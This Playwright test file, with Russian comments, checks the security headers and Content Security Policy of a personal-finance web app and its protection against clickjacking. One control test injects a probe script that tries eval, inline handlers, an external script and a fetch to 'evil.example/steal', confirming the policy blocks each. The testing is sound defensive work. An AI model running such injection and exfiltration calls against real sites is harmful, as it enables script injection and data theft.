import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import type { Page } from '@playwright/test';
import { addTx, createWallet, dismissToasts, expect, goSection, sheet, test, waitReady } from '../helpers';
import { DIST, ROOT, headersFor, parseCsp, readVercel, recordViolations, startHeaderServer, type HeaderServer } from './helpers';

/* ---------------------------------------------------------------------------------------------
 * Политика безопасности страницы (CSP): приложение работает под НАСТОЯЩИМИ заголовками из vercel.json и мета-тегом
 * из index.html без единого нарушения; сама политика действительно что-то запрещает (контроль «не пустышка»).
 * ------------------------------------------------------------------------------------------- */

let srv: HeaderServer;
test.beforeAll(async () => {
  srv = await startHeaderServer(DIST);
});
test.afterAll(async () => {
  await srv.close();
});

const headerCsp = (): string => headersFor('/')['content-security-policy'] ?? '';
const metaCsp = (): string => {
  const html = readFileSync(join(ROOT, 'index.html'), 'utf8');
  const m = html.match(/http-equiv="Content-Security-Policy"\s+content="([^"]*)"/);
  return m?.[1] ?? '';
};

test.describe('Статика: vercel.json и index.html', () => {
  test('заголовки безопасности заданы для всех путей', () => {
    const h = headersFor('/anything/at/all.js');
    expect(h['x-content-type-options']).toBe('nosniff');
    expect(h['referrer-policy']).toMatch(/^(no-referrer|strict-origin-when-cross-origin)$/);
    expect(h['x-frame-options']).toBe('DENY');
    expect(h['strict-transport-security']).toMatch(/max-age=\d{7,}/);
    const pp = h['permissions-policy'] ?? '';
    for (const f of ['camera', 'microphone', 'geolocation']) expect(pp, f).toContain(`${f}=()`);
    expect(parseCsp(h['content-security-policy'] ?? '')['frame-ancestors']).toEqual(["'none'"]);
  });

  test('кэш: index.html, корень, sw.js — no-cache; /assets/* — навсегда', () => {
    for (const p of ['/', '/index.html', '/sw.js']) expect(headersFor(p)['cache-control'], p).toBe('no-cache');
    expect(headersFor('/assets/index-abc.js')['cache-control']).toBe('public, max-age=31536000, immutable');
    // обычные файлы не должны случайно получить «навсегда»
    expect(headersFor('/manifest.webmanifest')['cache-control']).not.toMatch(/immutable/);
  });

  test('CSP: без unsafe-eval и без unsafe-inline в скриптах; опасные директивы закрыты', () => {
    const csp = parseCsp(headerCsp());
    expect(csp['default-src']).toEqual(["'self'"]);
    expect(csp['script-src']).toEqual(["'self'"]);
    expect(csp['object-src']).toEqual(["'none'"]);
    expect(csp['base-uri']).toEqual(["'self'"]);
    expect(csp['form-action']).toEqual(["'self'"]);
    expect(csp['worker-src']).toEqual(["'self'"]);
    expect(csp['manifest-src']).toEqual(["'self'"]);
    expect(headerCsp()).not.toMatch(/unsafe-eval|\*(?![.])| data:[^;]*script/);
    expect(csp['style-src']).toEqual(["'self'"]);
    // 'unsafe-inline' нет нигде: React ставит style через CSSOM, это политика не блокирует (проверено на всех экранах ниже)
    const withUnsafe = Object.entries(csp).filter(([, v]) => v.includes("'unsafe-inline'")).map(([k]) => k);
    expect(withUnsafe).toEqual([]);
  });

  test('CSP: connect-src — только свои, Supabase и источники курсов из src/rates', () => {
    const connect = parseCsp(headerCsp())['connect-src'] ?? [];
    expect(connect).toEqual(
      expect.arrayContaining(["'self'", 'https://*.supabase.co', 'wss://*.supabase.co', 'https://www.nbt.tj', 'https://cdn.jsdelivr.net', 'https://latest.currency-api.pages.dev']),
    );
    // каждый внешний адрес в исходниках курсов разрешён
    const api = readFileSync(join(ROOT, 'src/rates/api.ts'), 'utf8');
    const nbt = readFileSync(join(ROOT, 'src/rates/nbt.ts'), 'utf8');
    const hosts = [...(api + nbt).matchAll(/'(https:\/\/[^'/]+)\//g)].map((m) => m[1]!);
    for (const h of new Set(hosts)) expect(connect, `источник курсов ${h}`).toContain(h);
  });

  test('мета-CSP в index.html совпадает с заголовком, кроме frame-ancestors (в мета не работает) и style-src (нужен dev-серверу)', () => {
    const meta = parseCsp(metaCsp());
    const head = parseCsp(headerCsp());
    expect(meta['frame-ancestors']).toBeUndefined();
    delete head['frame-ancestors'];
    // dev-сервер Vite вставляет CSS через <style>: в мета разрешён inline-стиль, а боевой заголовок строгий (побеждает строгий)
    expect(meta['style-src']).toEqual(["'self'", "'unsafe-inline'"]);
    expect(head['style-src']).toEqual(["'self'"]);
    delete meta['style-src'];
    delete head['style-src'];
    expect(meta).toEqual(head);
  });

  test('в собранном index.html нет встроенных скриптов и обработчиков on*=', () => {
    const html = readFileSync(join(DIST, 'index.html'), 'utf8');
    const inline = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)].filter(([, attrs, body]) => !/\bsrc=/.test(attrs!) || body!.trim() !== '');
    expect(inline.map((m) => m[0].slice(0, 80))).toEqual([]);
    expect(html).not.toMatch(/\son[a-z]+\s*=/i);
    expect(html).toMatch(/Content-Security-Policy/); // мета дошло до сборки
  });
});

/* ------------------------------ браузер ------------------------------ */

/** Внешние хосты «отвечают» пустым 404 с CORS; запрос, дошедший сюда, CSP НЕ заблокировал. */
const REFERERS: string[] = [];
async function stubExternal(page: Page, origin: string): Promise<string[]> {
  const reached: string[] = [];
  await page.context().route(
    (u) => u.origin !== origin,
    async (route) => {
      reached.push(route.request().url());
      const ref = route.request().headers()['referer'];
      if (ref) REFERERS.push(`${route.request().url()} <- ${ref}`);
      await route.fulfill({ status: 404, headers: { 'access-control-allow-origin': '*' }, contentType: 'text/plain', body: 'нет' });
    },
  );
  return reached;
}

test.describe('CSP в настоящем браузере', () => {
  test('все экраны и шиты: ни одного нарушения CSP, ни одной ошибки консоли; курсы идут к разрешённым хостам', async ({ page }, testInfo) => {
    const violations = await recordViolations(page);
    const external = await stubExternal(page, srv.origin);
    const warnings: string[] = [];
    page.on('console', (m) => {
      if (m.type() === 'warning') warnings.push(m.text());
    });

    await page.goto(`${srv.origin}/#/`);
    await waitReady(page);

    // операции: расход, доход, перевод между своими кошельками
    await createWallet(page, { name: 'Карта', opening: '50' });
    await goSection(page, 'Главная');
    await addTx(page, { amount: '12,5', category: 'Еда', note: 'хлеб' });
    await addTx(page, { kind: 'income', amount: '300', wallet: 'Наличные' });
    await addTx(page, { kind: 'transfer', amount: '20', wallet: 'Наличные', toWallet: 'Карта' });
    await dismissToasts(page);

    // «Операции»: правка, фильтры, период
    await goSection(page, 'Операции');
    await page.getByRole('button', { name: /хлеб/ }).click();
    const edit = sheet(page, 'Правка операции');
    await expect(edit).toBeVisible();
    await page.keyboard.press('Escape');
    await expect(edit).toBeHidden();
    await page.getByRole('button', { name: /^Фильтры/ }).click();
    await expect(sheet(page, /Фильтры/)).toBeVisible();
    await page.keyboard.press('Escape');
    await page.getByRole('searchbox', { name: 'Поиск по заметке' }).fill('хл');

    // «Кошельки»: сверка
    await goSection(page, 'Кошельки');
    await page.getByRole('button', { name: 'Сверка: Карта' }).click();
    await expect(sheet(page, /Сверка/)).toBeVisible();
    await page.keyboard.press('Escape');

    // «Настройки»: все разделы, курсы (сеть к nbt/jsdelivr), проверка данных, выгрузки
    await goSection(page, 'Настройки');
    await page.getByRole('button', { name: 'Обновить курсы' }).click();
    await expect.poll(() => external.length, { message: 'запросов курсов не было' }).toBeGreaterThan(0);
    await page.getByRole('button', { name: 'Проверить данные' }).click();
    for (const name of ['Скачать копию (JSON)', 'Скачать операции (CSV)']) {
      const [dl] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name }).click()]);
      expect(dl.suggestedFilename()).toMatch(/^finora-/);
    }
    await page.getByRole('link', { name: 'Категории' }).click();
    await expect(page.getByRole('heading', { level: 1, name: 'Категории' })).toBeVisible();
    await page.getByRole('button', { name: 'Добавить', exact: true }).click();
    await expect(sheet(page, /категори/i)).toBeVisible();
    await page.keyboard.press('Escape');

    // страница с неизвестным адресом и экран входа по прямой ссылке
    await page.goto(`${srv.origin}/#/nonexistent?next=https://evil.example`);
    await waitReady(page);

    expect(await violations(), 'нарушения CSP').toEqual([]);
    // запросы курсов дошли только до хостов из белого списка
    const hosts = new Set(external.map((u) => new URL(u).origin));
    for (const h of hosts) expect(['https://www.nbt.tj', 'https://cdn.jsdelivr.net', 'https://latest.currency-api.pages.dev', 'https://abcdefgh.supabase.co']).toContain(h);
    expect(REFERERS, 'адрес приложения уходит во внешние запросы курсов (Referer)').toEqual([]);
    // браузер не жалуется на неизвестные признаки Permissions-Policy и т. п.
    expect(warnings.filter((w) => /Permissions-Policy|Feature-Policy|Content Security|X-Frame/i.test(w))).toEqual([]);
    testInfo.annotations.push({ type: 'external', description: [...hosts].join(', ') });
  });

  test('контроль: CSP действительно блокирует чужой скрипт, eval, inline-обработчик, <style> и запрос на чужой хост', async ({ page, errors }) => {
    // Здесь нарушения НЕ ошибка, а ожидаемый результат: их тексты в консоли не считаем поломкой.
    errors.allow(/Content Security Policy|Refused to|EvalError/i);
    const violations = await recordViolations(page);
    await page.goto(`${srv.origin}/#/`);
    await waitReady(page);

    // Проверки идут из файла со СВОЕГО адреса (его CSP разрешает): так eval и т. п. исполняются в обычных условиях страницы.
    // page.evaluate для eval не годится: протокол отладки сам разрешает eval в обход CSP.
    const probe = `(async () => {
      const out = {};
      window.__ran = false;
      const s = document.createElement('script'); s.textContent = 'window.__ran = true'; document.head.appendChild(s);
      out.inlineScript = String(window.__ran);
      try { out.eval = String(eval('1+1')); } catch (e) { out.eval = 'blocked:' + e.name; }
      try { out.fn = String(new Function('return 1')()); } catch (e) { out.fn = 'blocked:' + e.name; }
      try { out.timer = await new Promise((ok) => { setTimeout('window.__ran = true', 0); setTimeout(() => ok(String(window.__ran)), 100); }); } catch (e) { out.timer = 'blocked:' + e.name; }
      const ext = document.createElement('script'); ext.src = 'https://evil.example/x.js'; document.head.appendChild(ext);
      const st = document.createElement('style'); st.textContent = 'body{outline:9px solid red !important}'; document.head.appendChild(st);
      out.styleApplied = String(getComputedStyle(document.body).outlineWidth === '9px');
      try { await fetch('https://evil.example/steal?x=1'); out.fetch = 'sent'; } catch (e) { out.fetch = 'blocked:' + e.name; }
      const img = new Image(); img.src = 'https://evil.example/pixel.gif';
      const d = document.createElement('div');
      d.innerHTML = '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="window.__ran=true">';
      document.body.appendChild(d);
      await new Promise((r) => setTimeout(r, 300));
      out.inlineHandler = String(window.__ran);
      document.documentElement.setAttribute('data-probe', JSON.stringify(out));
    })();`;
    await page.route(`${srv.origin}/__probe.js`, (route) => route.fulfill({ status: 200, contentType: 'text/javascript', headers: headersFor('/__probe.js'), body: probe }));
    await page.evaluate(() => {
      const el = document.createElement('script');
      el.src = '/__probe.js';
      document.head.appendChild(el);
    });
    await expect(page.locator('html')).toHaveAttribute('data-probe', /./, { timeout: 10_000 });
    const result = JSON.parse((await page.locator('html').getAttribute('data-probe')) ?? '{}') as Record<string, string>;

    expect(result.inlineScript).toBe('false');
    expect(result.eval).toMatch(/^blocked/);
    expect(result.fn).toMatch(/^blocked/);
    expect(result.timer).toBe('false'); // setTimeout со строкой — тот же eval
    expect(result.styleApplied).toBe('false');
    expect(result.fetch).toMatch(/^blocked/);
    expect(result.inlineHandler).toBe('false');
    const v = await violations();
    const dirs = new Set(v.map((x) => x.directive));
    for (const d of ['script-src-elem', 'script-src', 'style-src-elem', 'connect-src', 'img-src']) {
      expect(dirs.has(d), `нарушение ${d} должно быть зафиксировано: ${[...dirs].join(', ')}`).toBe(true);
    }
  });

  test('сервис-воркер регистрируется под CSP, приложение открывается без сети', async ({ page }, testInfo) => {
    test.skip(testInfo.project.name !== 'desktop', 'один раз, на «desktop»');
    const violations = await recordViolations(page);
    await page.goto(`${srv.origin}/#/`);
    await waitReady(page);
    await page.evaluate(async () => {
      const reg = await navigator.serviceWorker.ready;
      if (!reg.active) throw new Error('воркер не активен');
    });
    await page.reload();
    await waitReady(page);
    await expect.poll(() => page.evaluate(() => navigator.serviceWorker.controller !== null)).toBe(true);

    await page.context().setOffline(true);
    await page.reload();
    await waitReady(page);
    await goSection(page, 'Настройки');
    await page.context().setOffline(false);
    expect(await violations(), 'нарушения CSP при работе воркера').toEqual([]);
    // заголовок CSP реально пришёл (а не только мета)
    const r = await page.request.get(`${srv.origin}/sw.js`);
    expect(r.headers()['content-security-policy']).toContain("frame-ancestors 'none'");
    expect(r.headers()['cache-control']).toBe('no-cache');
  });

  test('заголовки на ответах: html, sw.js, ассеты', async ({ request }) => {
    const idx = await request.get(`${srv.origin}/`);
    expect(idx.headers()['x-content-type-options']).toBe('nosniff');
    expect(idx.headers()['x-frame-options']).toBe('DENY');
    expect(idx.headers()['cache-control']).toBe('no-cache');
    const html = await idx.text();
    const asset = html.match(/src="\.\/(assets\/[^"]+\.js)"/)?.[1];
    expect(asset).toBeTruthy();
    const a = await request.get(`${srv.origin}/${asset}`);
    expect(a.headers()['cache-control']).toBe('public, max-age=31536000, immutable');
    expect(a.headers()['content-type']).toMatch(/javascript/);
  });

  test('clickjacking: чужая страница не может встроить приложение во фрейм', async ({ page, errors }) => {
    errors.allow(/Refused to frame/);
    const { startHostPage } = await import('./helpers');
    const host = await startHostPage(`<!doctype html><iframe id="f" src="${srv.origin}/#/" width="400" height="600"></iframe>`);
    try {
      const blocked: string[] = [];
      page.on('console', (m) => {
        if (/frame-ancestors|X-Frame-Options|Refused to display/i.test(m.text())) blocked.push(m.text());
      });
      await page.goto(host.origin);
      await page.waitForTimeout(1500);
      const frame = page.frames().find((f) => f !== page.mainFrame());
      const appVisible = frame ? await frame.locator('nav[aria-label="Основная навигация"]').count().catch(() => 0) : 0;
      expect(appVisible, 'приложение отрисовалось внутри чужого фрейма').toBe(0);
      expect(blocked.length, 'браузер должен сообщить о блокировке фрейма').toBeGreaterThan(0);
    } finally {
      await host.close();
    }
  });
});

test('vercel.json: валидный JSON, только headers (без редиректов и rewrites)', () => {
  const v = readVercel() as Record<string, unknown>;
  expect(Object.keys(v).filter((k) => k !== '$schema')).toEqual(['headers']);
});
